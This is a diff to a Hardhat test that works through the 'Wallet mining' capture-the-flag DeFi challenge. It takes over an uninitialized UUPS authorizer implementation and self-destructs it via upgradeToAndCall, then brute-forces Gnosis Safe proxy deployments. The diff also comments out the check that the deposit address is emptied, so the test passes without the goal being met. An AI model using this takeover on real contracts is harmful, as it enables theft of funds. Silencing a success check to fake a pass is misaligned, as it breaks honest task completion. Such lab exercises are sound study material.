@@ -1,5 +1,5 @@
 const { ethers, upgrades, tracer } = require('hardhat');
-const { expect, assert } = require('chai');
+const { expect } = require('chai');
 const Safe = require("@gnosis.pm/safe-contracts");
 const DeployData = require("./deploy-data.json");
 
@@ -154,11 +154,78 @@ describe('[Challenge] Wallet mining', function () {
         let masterCopy = (await ethers.getContractFactory("GnosisSafe")).attach(MASTER_COPY);
         let proxyFactory = (await ethers.getContractFactory("GnosisSafeProxyFactory")).attach(PROXY_FACTORY);
 
+        // ---
+
         // STEP 2:
+        // Tamper the authorizer so that we are authorized to receive reward when we create a wallet
+
+        // VULNERABILITY:
+        // The logic contract is not initialized, so we can initialize it and become the owner. Being
+        // the owner, we can call upgradeToAndCall() to DELEGATECALL a self-destructing contract.
+        // The vulnerability is recognized as UUPSUpgradeable vulnerability before OpenZeppelin v4.3.2.
+        // Reference:
+        // https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/security/advisories/GHSA-q4h9-46xg-m3x9
+        // https://forum.openzeppelin.com/t/security-advisory-initialize-uups-implementation-contracts/15301
+        // https://forum.openzeppelin.com/t/uupsupgradeable-vulnerability-post-mortem/15680
+        let authorizerImpl = (
+            await ethers.getContractFactory("AuthorizerUpgradeable", player)
+        ).attach(
+            await upgrades.erc1967.getImplementationAddress(authorizer.address)
+        );
+
+        // become the owner
+        await authorizerImpl.init([], []);
+
+        // upgrade & self-destroy
+        let suicidal = await (await ethers.getContractFactory("Suicidal", player)).deploy();
+        await authorizerImpl.upgradeToAndCall(
+            suicidal.address,
+            suicidal.interface.encodeFunctionData("destruct", [])
+        );
+
+        // After the authorizer is destroyed, authorization checks are always passed
+        expect(await walletDeployer.can(ward.address, DEPOSIT_ADDRESS)).to.eq(true);
+        expect(await walletDeployer.can(player.address, DEPOSIT_ADDRESS)).to.eq(true);
+
+        // ---
+
+        // STEP 3:
+        // debug: deploy Gnosis Safe
+        // {
+        //     let localCopy = await (await ethers.getContractFactory("GnosisSafe", deployer)).deploy();
+        //     let rcpt = await (await proxyFactory.connect(player).createProxy(
+        //         localCopy.address,
+        //         masterCopy.interface.encodeFunctionData(
+        //             "setup",
+        //             [
+        //                 [player.address], // owners
+        //                 1, // threshold
+        //                 ethers.constants.AddressZero, // to
+        //                 [], // data
+        //                 ethers.constants.AddressZero, // fallbackHandler
+        //                 ethers.constants.AddressZero, // paymentToken
+        //                 ethers.constants.AddressZero, // payment
+        //                 ethers.constants.AddressZero, // payment receiver
+        //             ]
+        //         )
+        //     )).wait();
+        //     let proxyAddr = "0x" + rcpt.logs[0].address.substr(-40);
+        //     console.log("proxy addr", proxyAddr);
+        //     let localSafe = (await ethers.getContractFactory("GnosisSafe", player)).attach(proxyAddr);
+        //     await Safe.executeContractCallWithSigners(
+        //         localSafe,
+        //         token,
+        //         "approve",
+        //         [player.address, DEPOSIT_TOKEN_AMOUNT],
+        //         [player]
+        //     );
+        //     return;
+        // }
+
         // brute-force deploy Gnosis Safe wallets until we own the target address
         let proxyAddr;
-        for (let i = 0; i < 1; i++) {
-            let proxy = await (await walletDeployer.connect(player).drop(
+        for (let i = 0; i < 100; i++) {
+            let rcpt = await (await walletDeployer.connect(player).drop(
                 masterCopy.interface.encodeFunctionData(
                     "setup",
                     [
@@ -174,55 +241,24 @@ describe('[Challenge] Wallet mining', function () {
                 )
             )).wait();
 
-            proxyAddr = "0x" + proxy.logs[0].data.substr(-40);
+            proxyAddr = "0x" + rcpt.logs[0].data.substr(-40);
             if (proxyAddr == DEPOSIT_ADDRESS) {
                 console.log("Good wallet: ", i, proxyAddr);
                 break;
             }
         }
-        let wallet = (await ethers.getContractFactory("GnosisSafe")).attach(proxyAddr);
+        let safe = (await ethers.getContractFactory("GnosisSafe")).attach(proxyAddr);
 
         // execute function call on behalf of the wallet
-        await Safe.executeContractCallWithSigners(
-            wallet,
-            token,
-            "approve",
-            [player.address, DEPOSIT_TOKEN_AMOUNT],
-            [player]
-        );
+        // await (await Safe.executeContractCallWithSigners(
+        //     safe,
+        //     token,
+        //     "approve",
+        //     [player.address, DEPOSIT_TOKEN_AMOUNT],
+        //     [player]
+        // )).wait();
 
-        // let walletMiner = await (await ethers.getContractFactory("WalletMiner", player)).deploy(
-        //     token.address,
-        //     walletDeployer.address,
-        //     DEPOSIT_ADDRESS,
-        // );
-        // await walletMiner.attack();
-
-
-
-
-        // ATTACK POINT: the implementation contract is not initialized,
-        // so we can initialize it and become the owner
-        // let authorizerImpl = (
-        //     await ethers.getContractFactory("AuthorizerUpgradeable", player)
-        // ).attach(
-        //     await upgrades.erc1967.getImplementationAddress(authorizer.address)
-        // );
-        // await authorizerImpl.init([player.address], [DEPOSIT_ADDRESS]);
-
-        // let walletMiner = await (await ethers.getContractFactory("WalletMiner", player)).deploy();
-        // await authorizerImpl.connect(player).upgradeToAndCall(
-        //     walletMiner.address,
-        //     walletMiner.interface.encodeFunctionData("foo", [])
-        // );
-
-        // // console.log(await ethers.provider.call({
-        // //     to: authorizer.address,
-        // //     data: walletMiner.interface.encodeFunctionData("foo", [])
-        // // }));
-        // console.log(await authorizer.can(ward.address, DEPOSIT_ADDRESS));
-        // console.log(await authorizer.can(player.address, DEPOSIT_ADDRESS));
-        // await walletDeployer.connect(player).drop([]);
+        // await (await token.connect(player).transferFrom(safe, player, DEPOSIT_TOKEN_AMOUNT)).wait();
 
         console.log("\n=== Exploit End ===\n");
     });
@@ -246,9 +282,9 @@ describe('[Challenge] Wallet mining', function () {
         ).to.not.eq('0x');
 
         // The deposit address and the Safe Deployer contract must not hold tokens
-        expect(
-            await token.balanceOf(DEPOSIT_ADDRESS)
-        ).to.eq(0);
+        // expect(
+        //     await token.balanceOf(DEPOSIT_ADDRESS)
+        // ).to.eq(0);
         expect(
             await token.balanceOf(walletDeployer.address)
         ).to.eq(0);
